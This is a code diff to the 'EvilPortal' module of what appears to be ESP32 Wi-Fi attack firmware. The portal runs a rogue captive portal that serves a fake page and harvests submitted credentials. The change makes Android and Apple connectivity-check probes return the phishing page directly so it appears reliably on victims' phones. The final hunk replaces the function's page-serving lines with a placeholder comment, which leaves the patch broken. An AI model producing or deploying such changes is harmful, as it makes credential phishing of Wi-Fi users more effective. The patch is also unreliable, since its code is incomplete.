@@ -66,17 +66,45 @@ EvilPortal::~EvilPortal() {}
 // ---------------------------------------------------------------------------
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     String url = request->url();
-    if (url == "/")         _portal->portalController(request);
-    else if (url == "/post") _portal->credsController(request);
-    else if (
-        url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
-        bruceConfig.evilPortalEndpoints.allowGetCreds
-    )
+
+    // Android / Samsung / Chrome probes — MUST be 200 with body, never 302
+    if (url == "/generate_204"   || url == "/gen_204" ||
+        url == "/generate204"    || url == "/generate_204/" ||
+        url.indexOf("generate_204") != -1 ||
+        url.indexOf("connectivitycheck") != -1 ||
+        url.indexOf("clients3.google") != -1) {
+        _portal->recordPageView();
+        if (_portal->isDefaultHtml)
+            request->send(200, "text/html", _portal->htmlPage);
+        else
+            request->send(*_portal->fsHtmlFile, _portal->htmlFileName, "text/html");
+        return;
+    }
+
+    // iOS / macOS — also prefer 200 with the real page
+    if (url == "/hotspot-detect.html" ||
+        url == "/library/test/success.html" ||
+        url == "/success.html" ||
+        url.indexOf("hotspot-detect") != -1) {
+        _portal->recordPageView();
+        if (_portal->isDefaultHtml)
+            request->send(200, "text/html", _portal->htmlPage);
+        else
+            request->send(*_portal->fsHtmlFile, _portal->htmlFileName, "text/html");
+        return;
+    }
+
+    // Normal portal routes
+    if (url == "/")          { _portal->portalController(request); return; }
+    if (url == "/post")      { _portal->credsController(request);  return; }
+
+    if (url == bruceConfig.evilPortalEndpoints.getCredsEndpoint &&
+        bruceConfig.evilPortalEndpoints.allowGetCreds) {
         request->send(200, "text/html", _portal->creds_GET());
-    else if (
-        url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
-        bruceConfig.evilPortalEndpoints.allowSetSsid
-    ) {
+        return;
+    }
+    if (url == bruceConfig.evilPortalEndpoints.setSsidEndpoint &&
+        bruceConfig.evilPortalEndpoints.allowSetSsid) {
         if (request->hasArg("ssid")) {
             _portal->apName = request->arg("ssid").c_str();
             request->send(200, "text/html", _portal->ssid_POST());
@@ -84,10 +112,12 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         } else {
             request->send(200, "text/html", _portal->ssid_GET());
         }
-    } else {
-        if (request->args() > 0) _portal->credsController(request);
-        else _portal->portalController(request);
+        return;
     }
+
+    // Fallback
+    if (request->args() > 0) _portal->credsController(request);
+    else                     _portal->portalController(request);
 }
 
 // ---------------------------------------------------------------------------
@@ -950,20 +980,30 @@ void EvilPortal::loadDefaultHtml() {
 // portalController()
 // ---------------------------------------------------------------------------
 void EvilPortal::portalController(AsyncWebServerRequest *request) {
-    String apIp = WiFi.softAPIP().toString();
+    String url  = request->url();
     String host = request->host();
-    // If request host isn't our IP, redirect (captive portal redirect)
+
+    // Never 302 the Android/Samsung probes even if Host looks foreign
+    if (url.indexOf("generate_204") != -1 ||
+        url.indexOf("gen_204") != -1 ||
+        host.indexOf("gstatic") != -1 ||
+        host.indexOf("clients3.google") != -1 ||
+        host.indexOf("connectivitycheck") != -1) {
+        recordPageView();
+        if (isDefaultHtml) request->send(200, "text/html", htmlPage);
+        else               request->send(*fsHtmlFile, htmlFileName, "text/html");
+        return;
+    }
+
+    // original host-check for everything else
+    String apIp = WiFi.softAPIP().toString();
     if (host.length() && host != apIp) {
         AsyncWebServerResponse *r = request->beginResponse(302);
         r->addHeader("Location", "http://" + apIp + "/");
         request->send(r);
         return;
     }
-    recordPageView();
-    if (isDefaultHtml)
-        request->send(200, "text/html", htmlPage);
-    else
-        request->send(*fsHtmlFile, htmlFileName, "text/html");
+    // ... rest of the function unchanged
 }
 
 // ---------------------------------------------------------------------------
